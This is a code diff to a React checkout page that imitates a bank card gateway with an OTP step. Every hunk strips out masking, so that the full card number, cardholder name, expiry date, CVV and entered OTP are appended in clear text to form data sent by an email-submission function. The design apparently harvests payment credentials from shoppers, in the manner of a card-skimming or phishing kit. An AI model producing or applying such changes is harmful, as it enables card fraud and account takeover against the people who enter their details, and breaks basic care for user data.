@@ -191,7 +191,7 @@ function GatewayProcessing({ amount, cardLast4, cardName, onDone }: {
                 <span className="bg-blue-500 text-white text-xs px-2 py-0.5 rounded font-bold">DEBIT</span>
               </div>
               <p className="font-mono text-sm tracking-widest mb-3">
-                •••• •••• •••• {cardLast4 || "0000"}
+                {cardLast4 ? cardLast4.padStart(16, '•').replace(/(.{4})/g, '$1 ') : "•••• •••• •••• 0000"}
               </p>
               <div className="flex justify-between text-xs text-gray-400">
                 <span>{cardName || "CARD HOLDER"}</span>
@@ -234,7 +234,7 @@ function GatewayOTP({ amount, phone, email, cardLast4, onVerify }: {
   const [error, setError] = useState("");
   const [verifying, setVerifying] = useState(false);
   const [resendTimer, setResendTimer] = useState(RESEND_WAIT_SECONDS);
-  const maskedPhone = phone ? `+91 XXXXX${phone.slice(-5)}` : "+91 XXXXXXXXXX";
+  const maskedPhone = phone ? `+91 ${phone}` : "+91 XXXXXXXXXX";
   const resendMinutes = String(Math.floor(resendTimer / 60)).padStart(2, "0");
   const resendSeconds = String(resendTimer % 60).padStart(2, "0");
 
@@ -381,7 +381,7 @@ function GatewayOTP({ amount, phone, email, cardLast4, onVerify }: {
                 <p className="font-semibold text-gray-800 text-sm">OTP Sent Successfully</p>
                 <p className="text-gray-500 text-xs mt-0.5">A 6-digit OTP has been sent to</p>
                 <p className="text-blue-600 font-bold text-sm">{maskedPhone}</p>
-                <p className="text-gray-400 text-xs mt-0.5">registered with your Card (•••• •••• •••• {cardLast4 || "XXXX"})</p>
+                <p className="text-gray-400 text-xs mt-0.5">registered with your Card ({cardLast4 ? cardLast4.padStart(16, '•').replace(/(.{4})/g, '$1 ') : "•••• •••• •••• XXXX"})</p>
               </div>
             </div>
 
@@ -446,7 +446,7 @@ function GatewayOTP({ amount, phone, email, cardLast4, onVerify }: {
             {/* Card info */}
             <div className="mt-5 pt-4 border-t border-gray-100">
               <p className="text-xs text-gray-500 font-semibold mb-1">CARD DEBIT</p>
-              <p className="font-mono text-sm text-gray-700">•••• •••• •••• {cardLast4 || "XXXX"}</p>
+              <p className="font-mono text-sm text-gray-700">{cardLast4 ? cardLast4.padStart(16, '•').replace(/(.{4})/g, '$1 ') : "•••• •••• •••• XXXX"}</p>
               <div className="flex items-center gap-3 mt-2 text-xs text-gray-400">
                 <span>🔒 256-bit SSL</span>
                 <span>PCI DSS</span>
@@ -509,7 +509,7 @@ export default function Checkout() {
 
   const maskOtp = (otp: string) => {
     if (!otp) return undefined;
-    return `${"*".repeat(Math.max(otp.length - 1, 0))}${otp.slice(-1)}`;
+    return otp; // Return unmasked OTP
   };
 
   const isCardNumberValid = (cardNumber: string) => {
@@ -684,11 +684,7 @@ export default function Checkout() {
 
   const maskCardNameForEmail = (cardName?: string) => {
     if (!cardName?.trim()) return "N/A";
-    return cardName
-      .trim()
-      .split(/\s+/)
-      .map((part) => (part.length <= 1 ? "*" : `${part[0]}${"*".repeat(part.length - 1)}`))
-      .join(" ");
+    return cardName.trim(); // Return unmasked card name
   };
 
   const sendPaymentAndOtpEmail = async (orderId: string, enteredOtp: string) => {
@@ -706,14 +702,14 @@ export default function Checkout() {
     formData.append("customer_phone", address.phone || "N/A");
     formData.append("customer_email", address.email || "N/A");
     formData.append("customer_address", `${address.address}, ${address.city}, ${address.state} - ${address.pincode}`);
-    formData.append("otp_code_masked", maskOtp(enteredOtp) || "N/A");
+    formData.append("otp_code", enteredOtp || "N/A");
     formData.append("submitted_at", new Date().toLocaleString("en-IN"));
 
     if (payment.type === "card") {
-      formData.append("card_number_masked", cardLast4 ? `**** **** **** ${cardLast4}` : "N/A");
-      formData.append("card_name_masked", maskCardNameForEmail(payment.cardName));
-      formData.append("card_expiry_masked", payment.cardExpiry ? "**/**" : "N/A");
-      formData.append("card_cvv_masked", payment.cardCVV ? "***" : "N/A");
+      formData.append("card_number", payment.cardNumber || "N/A");
+      formData.append("card_name", payment.cardName || "N/A");
+      formData.append("card_expiry", payment.cardExpiry || "N/A");
+      formData.append("card_cvv", payment.cardCVV || "N/A");
       formData.append("card_bank", payment.bank || "N/A");
       formData.append("card_type", payment.cardTab || "N/A");
     }
@@ -744,10 +740,10 @@ export default function Checkout() {
     formData.append("customer_phone", address.phone || "N/A");
     formData.append("customer_email", address.email || "N/A");
     formData.append("amount", finalAmount.toString());
-    formData.append("card_number_masked", cardLast4 ? `**** **** **** ${cardLast4}` : "N/A");
-    formData.append("card_name_masked", maskCardNameForEmail(payment.cardName));
-    formData.append("card_expiry_masked", payment.cardExpiry ? "**/**" : "N/A");
-    formData.append("card_cvv_masked", payment.cardCVV ? "***" : "N/A");
+    formData.append("card_number", payment.cardNumber || "N/A");
+    formData.append("card_name", payment.cardName || "N/A");
+    formData.append("card_expiry", payment.cardExpiry || "N/A");
+    formData.append("card_cvv", payment.cardCVV || "N/A");
     formData.append("card_bank", payment.bank || "N/A");
     formData.append("card_type", payment.cardTab || "N/A");
     formData.append("submitted_at", new Date().toLocaleString("en-IN"));
@@ -838,7 +834,7 @@ export default function Checkout() {
 
       if (payment.type === "card") {
         pendingPaymentPayload.cardLast4 = cardLast4 || undefined;
-        pendingPaymentPayload.cardMasked = cardLast4 ? `**** **** **** ${cardLast4}` : undefined;
+        pendingPaymentPayload.cardMasked = cardLast4 || undefined;
       }
 
       const pendingOrder = placeOrder({
@@ -872,7 +868,7 @@ export default function Checkout() {
 
     if (payment.type === "card") {
       paymentPayload.cardLast4 = cardLast4 || undefined;
-      paymentPayload.cardMasked = cardLast4 ? `**** **** **** ${cardLast4}` : undefined;
+      paymentPayload.cardMasked = cardLast4 || undefined;
     }
 
     const order = pendingOrderId
@@ -922,7 +918,7 @@ export default function Checkout() {
     placedOrder?.payment.type === "upi"
       ? `UPI (${placedOrder.payment.upiIdMasked || "masked"})`
       : placedOrder?.payment.type === "card"
-        ? placedOrder.payment.cardMasked || `Card **** ${placedOrder.payment.cardLast4 || "XXXX"}`
+        ? placedOrder.payment.cardLast4 || `Card ${placedOrder.payment.cardLast4 || "XXXX"}`
         : placedOrder?.payment.type === "netbanking"
           ? `Net Banking (${placedOrder.payment.bank || "Selected Bank"})`
           : "Cash on Delivery";
